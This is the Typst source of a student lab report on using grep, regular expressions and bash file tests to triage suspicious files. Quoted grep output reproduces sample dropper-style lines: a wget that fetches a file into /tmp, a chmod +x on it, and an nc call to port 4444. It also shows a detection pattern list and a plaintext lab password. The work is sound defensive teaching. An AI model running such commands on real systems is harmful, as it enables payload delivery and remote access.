#import "/template/lib.typ": *
#import "@preview/codly:1.3.0" as codly

#show: assignment.with(
  title: "Grep, Regular Expressions and File Test Operators",
  number: "Assignment 03",
  kind: "Lab",
  date: datetime(year: 2026, month: 8, day: 26),
)

#let sh(body) = codly.local(number-format: none)[#raw(body, lang: "bash", block: true)]
#let out(body) = codly.local(number-format: none)[#raw(body, block: true)]

#let q(desc, cmd, res: none) = block(above: 0.7em, below: 0.4em, breakable: true, {
  desc
  v(2pt)
  sh(cmd)
  if res != none { out(res) }
})

= Aim

Use `grep`, extended regular expressions (`grep -E`), file test operators, and
the conditional constructs `[ ]` and `[[ ]]` to triage sample files in the
`suspicious_file_lab/` directory. Parts A to E are run from inside that
directory. The scripts for Parts F to K are in the `scripts/` folder and prompt
for the filename with `read`.

= Part A: Basic grep

== Exercise 1: Search File Contents

#q([1. Line containing `wget`.], "grep wget payload.sh",
  res: "wget http://update-server.local/package.dat -O /tmp/package.dat")
#q([2. Line containing `nc` (matches two lines, as "maintenance" contains `nc`).], "grep nc payload.sh",
  res: "echo \"Starting maintenance\"\nnc 192.168.10.50 4444")
#q([3. Line containing `chmod`.], "grep chmod payload.sh", res: "chmod +x /tmp/package.dat")
#q([4. `WGET`, ignoring case.], "grep -i WGET payload.sh",
  res: "wget http://update-server.local/package.dat -O /tmp/package.dat")
#q([5. Line numbers containing `/tmp`.], "grep -n /tmp payload.sh",
  res: "3:TEMP_DIR=\"/tmp/system_cache\"\n6:wget http://update-server.local/package.dat -O /tmp/package.dat\n9:chmod +x /tmp/package.dat")
#q([6. Count of lines containing `/tmp`.], "grep -c /tmp payload.sh", res: "3")
#q([7. Print only the matched word.], "grep -o wget payload.sh", res: "wget")
#q([8. `nc` as a whole word.], "grep -w nc payload.sh", res: "nc 192.168.10.50 4444")

== Exercise 2: Compare Files

#q([`wget` across the three files (multiple filenames prefix each match).], "grep wget payload.sh update.sh cleanup.sh",
  res: "payload.sh:wget http://update-server.local/package.dat -O /tmp/package.dat")
#q([Filenames containing `wget`.], "grep -l wget payload.sh update.sh cleanup.sh", res: "payload.sh")
#q([Filenames containing `/tmp`.], "grep -l /tmp payload.sh update.sh cleanup.sh", res: "cleanup.sh\npayload.sh")

- Contains `wget`: `payload.sh`.
- Do not contain `wget`: `update.sh`, `cleanup.sh`.
- Contain `/tmp`: `payload.sh`, `cleanup.sh`.

== Exercise 3: Inverse Search

#q([Lines not containing `INFO`.], "grep -v INFO system.log",
  res: "WARNING Disk usage reached 80 percent\nERROR Backup operation failed\nWARNING Unusual file activity detected\nERROR Permission denied while accessing file\nFAILED Security update installation")
#q([Lines not containing `ERROR`.], "grep -v ERROR system.log")
#q([Lines except those containing `WARNING`.], "grep -v WARNING system.log")
#q([Count of non-`INFO` entries.], "grep -vc INFO system.log", res: "5")

= Part B: Security Log Analysis

== Exercise 4: Analyze system.log

#q([ERROR entries.], "grep ERROR system.log",
  res: "ERROR Backup operation failed\nERROR Permission denied while accessing file")
#q([WARNING entries.], "grep WARNING system.log",
  res: "WARNING Disk usage reached 80 percent\nWARNING Unusual file activity detected")
#q([FAILED entry.], "grep FAILED system.log", res: "FAILED Security update installation")
#q([Count of ERROR entries.], "grep -c ERROR system.log", res: "2")
#q([Line numbers containing WARNING.], "grep -n WARNING system.log",
  res: "3:WARNING Disk usage reached 80 percent\n7:WARNING Unusual file activity detected")
#q([`error`, irrespective of case.], "grep -i error system.log",
  res: "ERROR Backup operation failed\nERROR Permission denied while accessing file")
#q([Whether `Malware` occurs, without output ($?=1$ means absent).], "grep -q Malware system.log; echo $?", res: "1")

== Exercise 5: Context Investigation

#q([Two lines after each ERROR.], "grep -A2 ERROR system.log",
  res: "ERROR Backup operation failed\nINFO User admin logged in\nWARNING Unusual file activity detected\nERROR Permission denied while accessing file\nINFO System scan completed\nFAILED Security update installation")
#q([Two lines before each ERROR.], "grep -B2 ERROR system.log",
  res: "WARNING Disk usage reached 80 percent\nINFO Backup process started\nERROR Backup operation failed\nINFO User admin logged in\nWARNING Unusual file activity detected\nERROR Permission denied while accessing file")
#q([One line before and after each ERROR.], "grep -C1 ERROR system.log")
#q([Two lines around FAILED.], "grep -C2 FAILED system.log",
  res: "ERROR Permission denied while accessing file\nINFO System scan completed\nFAILED Security update installation\nINFO System shutdown initiated")

Context matters because an error line does not explain itself. The lines before
show the trigger and the preceding operation, and the lines after show the
consequence and whether the system recovered. Together they give the sequence
needed to establish the cause, scope, and timeline of an incident.

= Part C: grep -E

== Exercise 6: Multiple Security Events

#q([ERROR, WARNING, or FAILED in one command.], "grep -E 'ERROR|WARNING|FAILED' system.log",
  res: "WARNING Disk usage reached 80 percent\nERROR Backup operation failed\nWARNING Unusual file activity detected\nERROR Permission denied while accessing file\nFAILED Security update installation")

== Exercise 7: Multiple Suspicious Commands

#q([Any of `wget`, `curl`, `nc`, `chmod`.], "grep -E 'wget|curl|nc|chmod' payload.sh",
  res: "echo \"Starting maintenance\"\nwget http://update-server.local/package.dat -O /tmp/package.dat\nnc 192.168.10.50 4444\nchmod +x /tmp/package.dat")
#q([Count of matching lines.], "grep -cE 'wget|curl|nc|chmod' payload.sh", res: "4")

- Found: `wget`, `nc`, `chmod`. Not found: `curl`.
- Lines with at least one: 4. Three are the commands. The fourth is the
  `maintenance` line, matched because it contains the substring `nc`. Adding
  word boundaries (`grep -Ew`) reports the 3 genuine matches.

== Exercise 8: Search Multiple Files

#q([Filenames with at least one selected command.], "grep -lE 'wget|curl|nc|chmod' payload.sh update.sh cleanup.sh", res: "payload.sh")
#q([Matching lines with line numbers.], "grep -nE 'wget|curl|nc|chmod' *.sh",
  res: "payload.sh:2:echo \"Starting maintenance\"\npayload.sh:6:wget http://update-server.local/package.dat -O /tmp/package.dat\npayload.sh:8:nc 192.168.10.50 4444\npayload.sh:9:chmod +x /tmp/package.dat")
#q([Count of matching lines in each file.], "grep -cE 'wget|curl|nc|chmod' *.sh",
  res: "cleanup.sh:0\nmalwareA.sh:0\nmalware1.sh:0\npayload.sh:4\nupdate.sh:0\nmalware2.sh:0")

= Part D: patterns.txt

`grep -f patterns.txt` reads its patterns from the file (`wget`, `curl`, `nc`,
`chmod`, `password`, `FAILED`, `ERROR`, `WARNING`).

== Exercise 9: Pattern File Investigation

#q([Search `payload.sh`.], "grep -f patterns.txt payload.sh",
  res: "echo \"Starting maintenance\"\nwget http://update-server.local/package.dat -O /tmp/package.dat\nnc 192.168.10.50 4444\nchmod +x /tmp/package.dat")
#q([Search `system.log`.], "grep -f patterns.txt system.log",
  res: "WARNING Disk usage reached 80 percent\nERROR Backup operation failed\nWARNING Unusual file activity detected\nERROR Permission denied while accessing file\nFAILED Security update installation")
#q([Search `config.conf`.], "grep -f patterns.txt config.conf", res: "password=LabPassword123")
#q([Search all shell scripts, without filenames.], "grep -hf patterns.txt *.sh")
#q([Filenames containing at least one pattern.], "grep -lf patterns.txt *",
  res: "README.txt\nconfig.conf\npatterns.txt\npayload.sh\nsystem.log")

Files with real indicators: `payload.sh`, `system.log`, `config.conf`.

= Part E: filelist.txt

== Exercise 10: Beginning and End of Line

#q([Begin with `malware`.], "grep '^malware' filelist.txt", res: "malware1.sh\nmalware2.sh\nmalwareA.sh")
#q([Begin with `script`.], "grep '^script' filelist.txt", res: "script1.py\nscript2.py")
#q([End in `.sh`.], "grep '\\.sh$' filelist.txt",
  res: "payload.sh\nupdate.sh\ncleanup.sh\nmalware1.sh\nmalware2.sh\nmalwareA.sh")
#q([End in `.py`.], "grep '\\.py$' filelist.txt", res: "scanner.py\nscript1.py\nscript2.py")
#q([End in `.log`.], "grep '\\.log$' filelist.txt", res: "system.log\naccess.log")
#q([Begin with `p` and end in `.sh`.], "grep '^p.*\\.sh$' filelist.txt", res: "payload.sh")

== Exercise 11: Character Classes

#q([`malware1.sh` and `malware2.sh` in one pattern.], "grep 'malware[12]\\.sh' filelist.txt", res: "malware1.sh\nmalware2.sh")
#q([Containing a digit.], "grep '[0-9]' filelist.txt", res: "malware1.sh\nmalware2.sh\nscript1.py\nscript2.py")
#q([Containing digit 1 or 2.], "grep '[12]' filelist.txt", res: "malware1.sh\nmalware2.sh\nscript1.py\nscript2.py")
#q([Begin with `m` or `p`.], "grep '^[mp]' filelist.txt", res: "payload.sh\nmalware1.sh\nmalware2.sh\nmalwareA.sh")
#q([Begin with `s` or `u`.], "grep '^[su]' filelist.txt", res: "system.log\nupdate.sh\nscanner.py\nscript1.py\nscript2.py")

== Exercise 12: Negated Character Classes

#q([Do not begin with `m`.], "grep '^[^m]' filelist.txt",
  res: "report.txt\nsystem.log\naccess.log\nconfig.conf\npayload.sh\nupdate.sh\ncleanup.sh\nscanner.py\nscript1.py\nscript2.py\nnotes.pdf\nempty.txt\nrestricted.txt")
#q([Do not begin with `m` or `p`.], "grep '^[^mp]' filelist.txt")
#q([`malware` where the next character is not a digit.], "grep '^malware[^0-9]' filelist.txt", res: "malwareA.sh")

= Part F: File Operators

== Exercise 13: Does a File Exist?

#code(read("scripts/exists_check.sh"), file: "exists_check.sh")

#out("$ ./exists_check.sh
Enter filename: payload.sh
payload.sh exists
$ ./exists_check.sh
Enter filename: report.txt
report.txt exists
$ ./exists_check.sh
Enter filename: unknown.sh
unknown.sh does not exist")

== Exercise 14: Regular File, Directory, or Neither

#code(read("scripts/type_check.sh"), file: "type_check.sh")

#out("$ ./type_check.sh
Enter filename: payload.sh
payload.sh is a regular file
$ ./type_check.sh
Enter filename: system.log
system.log is a regular file
$ ./type_check.sh
Enter filename: quarantine
quarantine is a directory
$ ./type_check.sh
Enter filename: backup
backup is a directory
$ ./type_check.sh
Enter filename: unknown
unknown is neither a regular file nor a directory")

== Exercise 15: Readable, Writable, Executable

#code(read("scripts/perm_check.sh"), file: "perm_check.sh")

#out("$ ./perm_check.sh
Enter filename: payload.sh
File: payload.sh

Readable   : Yes
Writable   : Yes
Executable : Yes
$ ./perm_check.sh
Enter filename: update.sh
File: update.sh

Readable   : Yes
Writable   : Yes
Executable : Yes
$ ./perm_check.sh
Enter filename: report.txt
File: report.txt

Readable   : Yes
Writable   : Yes
Executable : No
$ ./perm_check.sh
Enter filename: config.conf
File: config.conf

Readable   : Yes
Writable   : Yes
Executable : No")

== Exercise 16: Empty or Not

#code(read("scripts/data_check.sh"), file: "data_check.sh")

#out("$ ./data_check.sh
Enter filename: payload.sh
File contains data
$ ./data_check.sh
Enter filename: empty.txt
File is empty")

= Part G: File Validation with [ ]

== Exercise 17: Four Checks

#code(read("scripts/validate.sh"), file: "validate.sh")

#out("$ ./validate.sh
Enter filename: payload.sh
Exists       : Yes
Regular File : Yes
Readable     : Yes
Non-empty    : Yes
$ ./validate.sh
Enter filename: empty.txt
Exists       : Yes
Regular File : Yes
Readable     : Yes
Non-empty    : No
$ ./validate.sh
Enter filename: unknown.sh
Exists       : No
Regular File : No
Readable     : No
Non-empty    : No")

== Exercise 18: [ ] with grep

#code(read("scripts/indicator_check.sh"), file: "indicator_check.sh")

#out("$ ./indicator_check.sh
Enter filename: payload.sh
Selected indicator detected, investigate further
$ ./indicator_check.sh
Enter filename: update.sh
Selected indicator not detected")

= Part H: Tests with [[ ]]

== Exercise 19: File Tests with [[ ]]

#code(read("scripts/validate_dbracket.sh"), file: "validate_dbracket.sh")

#out("$ ./validate_dbracket.sh
Enter filename: payload.sh
Exists       : Yes
Regular File : Yes
Readable     : Yes
Non-empty    : Yes
$ ./validate_dbracket.sh
Enter filename: empty.txt
Exists       : Yes
Regular File : Yes
Readable     : Yes
Non-empty    : No")

== Exercise 20: Regex with [[ ]]

#code(read("scripts/ext_check.sh"), file: "ext_check.sh")

#out("$ ./ext_check.sh
Enter filename: payload.sh
Shell script identified for inspection
$ ./ext_check.sh
Enter filename: scanner.py
File does not have a .sh extension
$ ./ext_check.sh
Enter filename: report.txt
File does not have a .sh extension")

== Exercise 21: Multiple Extensions

#code(read("scripts/script_ext_check.sh"), file: "script_ext_check.sh")

#out("$ ./script_ext_check.sh
Enter filename: payload.sh
Script file, inspect if required
$ ./script_ext_check.sh
Enter filename: scanner.py
Script file, inspect if required
$ ./script_ext_check.sh
Enter filename: report.txt
Not a recognised script file
$ ./script_ext_check.sh
Enter filename: config.conf
Not a recognised script file")

= Part I: grep with File Operators

== Exercise 22: Executable File Content Analysis

#code(read("scripts/exec_scan.sh"), file: "exec_scan.sh")

#out("$ ./exec_scan.sh
Enter filename: payload.sh
wget found in executable file payload.sh
$ ./exec_scan.sh
Enter filename: update.sh
wget not found in update.sh
$ ./exec_scan.sh
Enter filename: report.txt
report.txt is not executable")

== Exercise 23: grep -E with File Operators

#code(read("scripts/indicator_scan.sh"), file: "indicator_scan.sh")

#out("$ ./indicator_scan.sh
Enter filename: payload.sh
One or more selected indicators detected
$ ./indicator_scan.sh
Enter filename: report.txt
Selected indicators not detected
$ ./indicator_scan.sh
Enter filename: empty.txt
empty.txt failed the pre-checks (regular, readable, non-empty)")

= Part J: Configuration File Investigation

== Exercise 24: Sensitive Information Search

#code(read("scripts/config_scan.sh"), file: "config_scan.sh")

#out("$ ./config_scan.sh
Enter filename: config.conf
Scanning config.conf for authentication settings:
username=admin
password=LabPassword123")

Configuration files that hold authentication information need extra protection
because they store working credentials in plain text. Anyone who can read the
file gains a valid username and password and can log in, move laterally, or
escalate privileges. Such files should be owner-only (`chmod 600`), kept out of
world-readable locations and version control, and, where possible, replaced with
hashed values or an external secrets manager.

= Part K: Suspicious File Triage

== Exercise 25: file_check.sh

#code(read("scripts/file_check.sh"), file: "file_check.sh")

#out("$ ./file_check.sh
Enter filename: payload.sh

----- FILE INVESTIGATION -----

Exists        : Yes
Regular File  : Yes
Directory     : No
Readable      : Yes
Writable      : Yes
Executable    : Yes
Non-empty     : Yes
Shell Script  : Yes

wget          : Found
Selected indicators : Found

Further inspection recommended")
